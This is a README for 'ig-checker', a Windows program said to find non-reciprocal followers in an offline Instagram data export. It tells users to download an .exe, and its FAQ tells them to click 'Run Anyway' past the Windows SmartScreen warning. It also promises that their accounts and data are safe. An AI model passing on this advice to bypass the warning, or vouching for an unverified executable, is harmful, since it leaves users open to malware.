# 🔍 ig-checker - Manage your Instagram followers safely offline

[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/andrej806/ig-checker/releases)

Instagram changed its rules in December 2024. Your old apps no longer work. Most other tools now ask for your password or put your account at risk of a ban. IG Checker works differently. It processes your official Instagram data export on your own computer. Your data stays private. You keep your password safe. This tool creates a report in a single file that you can open in any web browser.

## 💾 Downloading and Setup

You need to save the software to your computer first. 

1. Visit the [official release page](https://github.com/andrej806/ig-checker/releases).
2. Look for the section labeled Assets.
3. Click the file that ends with .exe to save it to your Windows computer.
4. Open the folder where you saved the file.
5. Double-click the file to start the program.

## 📥 Preparing your Instagram Data

Before you use the software, you must get your data from Instagram. The software cannot see your account directly, which keeps your password safe.

1. Log into your Instagram account using a web browser.
2. Go to your Settings menu.
3. Select the option for Your Activity.
4. Look for Download Your Information.
5. Choose Request a Download.
6. Select the option to download your information as a JSON file. This format is the easiest for the app to read.
7. Wait for Instagram to send a link to your email.
8. Download the zip file provided by Instagram to your desktop.
9. Right-click the zip file and select Extract All.

## ⚙️ Running the Checker

Once you have your data ready, you can audit your followers.

1. Open the IG Checker software you downloaded.
2. Click the button labeled Open Data Folder.
3. Select the folder that contains the files you extracted from your Instagram zip file.
4. The software will scan your followers and following lists.
5. It will compare the two lists to find users who do not follow you back.
6. The window will display a summary of your account connections.

## 📄 Understanding the Report

The software creates a clean HTML file for you to view. This file contains the results of your audit.

* Total followers: The total number of people who follow your account.
* Following: The total number of people you follow.
* Not following back: A list of handles that appear in your following list but do not follow you back.
* Shared data: The software does not send your data to a server. Everything stays on your local machine.

## 🛠️ Customizing with Claude Code

This tool is built for users who want to change how the report looks. Because it is just a simple HTML file, you can use AI tools to style it.

1. Open the generated result file in a text editor or a code editor.
2. Copy the text inside the file.
3. Paste the text into an AI assistant like Claude Code.
4. Ask the AI to change the colors, add new information, or reorder the lists of followers.
5. Save the updated file and open it in your web browser.

## 🛡️ Privacy and Security

Privacy remains the main goal of this project. Many tools track your activity or log your keystrokes. IG Checker does not require a network connection to process files. You can turn off your internet while the scanner runs, and it will still work. Your Instagram password is never requested, and your follower data never leaves your computer.

## ❓ Frequently Asked Questions

What if the program does not open on Windows?
Windows might try to protect your computer from new software. If you see a blue box that says "Windows protected your PC," click More Info and then click Run Anyway.

Will my account get banned?
Instagram bans accounts that use external apps to log in to their private API. Because this tool never logs into your account, Instagram cannot detect it. You are safe.

Does this tool work on Mac or Linux?
The current download is for Windows. You can use the raw code files if you are comfortable with other operating systems.

Can I track unfollowers over time?
Yes. You can save your old export files in different folders. Run the checker on each folder to see how your follower list changed from week to week.

Is my data stored anywhere else?
No. The app processes everything in your computer's memory. Once you close the application, all processing data is cleared. Only the files you save remain on your hard drive.

Do I need to be a developer to use this?
No. This software is designed for casual users. You only need to know how to click buttons and move files between folders on your computer.

What should I do if the file is too large?
Instagram exports can be huge if you have years of data. If the software seems slow, close other programs like your web browser before you start the scan. This gives the software more power to process your files quickly.